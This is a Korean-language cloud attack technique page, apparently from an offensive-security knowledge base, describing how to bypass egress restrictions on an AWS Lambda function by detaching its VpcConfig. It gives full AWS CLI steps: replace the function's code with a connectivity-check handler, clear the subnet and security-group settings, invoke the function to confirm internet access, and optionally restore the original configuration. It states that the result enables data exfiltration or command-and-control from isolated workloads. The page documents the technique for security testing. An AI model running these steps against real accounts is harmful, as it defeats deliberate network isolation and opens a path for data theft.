# AWS Lambda – VPC Egress Bypass by Detaching VpcConfig

제한된 VPC에서 Lambda 함수를 강제로 분리하려면 빈 VpcConfig(SubnetIds=[], SecurityGroupIds=[])로 구성 업데이트를 수행합니다. 그러면 함수는 Lambda-managed 네트워킹 영역에서 실행되어 outbound 인터넷 접근을 회복하고 NAT 없는 private VPC 서브넷에서 적용되는 egress 제어를 우회합니다.

## 악용

- 전제 조건: 대상 함수에 대한 lambda:UpdateFunctionConfiguration 권한(검증을 위한 lambda:InvokeFunction 포함), 그리고 코드/핸들러를 변경할 경우 이를 업데이트할 권한.
- 가정: 함수가 현재 VpcConfig로 NAT 없는 private 서브넷을 가리키도록 구성되어 있어(따라서 outbound 인터넷이 차단됨).
- Region: us-east-1

### 단계

0) 아웃바운드 HTTP가 동작함을 증명하는 최소 핸들러 준비

cat > net.py <<'PY'
import urllib.request, json

def lambda_handler(event, context):
try:
ip = urllib.request.urlopen('https://checkip.amazonaws.com', timeout=3).read().decode().strip()
return {"egress": True, "ip": ip}
except Exception as e:
return {"egress": False, "err": str(e)}
PY
zip net.zip net.py
aws lambda update-function-code --function-name $TARGET_FN --zip-file fileb://net.zip --region $REGION || true
aws lambda update-function-configuration --function-name $TARGET_FN --handler net.lambda_handler --region $REGION || true

1) 현재 VPC 구성 기록(나중에 복원할 경우 대비)

aws lambda get-function-configuration --function-name $TARGET_FN --query 'VpcConfig' --region $REGION > /tmp/orig-vpc.json
cat /tmp/orig-vpc.json

2) 빈 리스트로 설정해 VPC 분리

aws lambda update-function-configuration \
--function-name $TARGET_FN \
--vpc-config SubnetIds=[],SecurityGroupIds=[] \
--region $REGION
until [ "$(aws lambda get-function-configuration --function-name $TARGET_FN --query LastUpdateStatus --output text --region $REGION)" = "Successful" ]; do sleep 2; done

3) 호출 및 아웃바운드 접근 확인

aws lambda invoke --function-name $TARGET_FN /tmp/net-out.json --region $REGION >/dev/null
cat /tmp/net-out.json

(Optional) 원래 VPC 구성 복원

if jq -e '.SubnetIds | length > 0' /tmp/orig-vpc.json >/dev/null; then
SUBS=$(jq -r '.SubnetIds | join(",")' /tmp/orig-vpc.json); SGS=$(jq -r '.SecurityGroupIds | join(",")' /tmp/orig-vpc.json)
aws lambda update-function-configuration --function-name $TARGET_FN --vpc-config SubnetIds=[$SUBS],SecurityGroupIds=[$SGS] --region $REGION
fi

### 영향
- 함수의 제한 없는 outbound 인터넷 액세스를 회복하여, NAT 없는 private 서브넷에 의도적으로 격리된 워크로드에서 data exfiltration 또는 C2가 가능하게 됩니다.

### 예시 출력 (VpcConfig 분리 후)

{"egress": true, "ip": "34.x.x.x"}

### 정리
- 임시로 수정한 코드/핸들러가 있다면 복원하세요.
- 위에서 저장한 /tmp/orig-vpc.json에 있는 원래 VpcConfig를 선택적으로 복원할 수 있습니다.
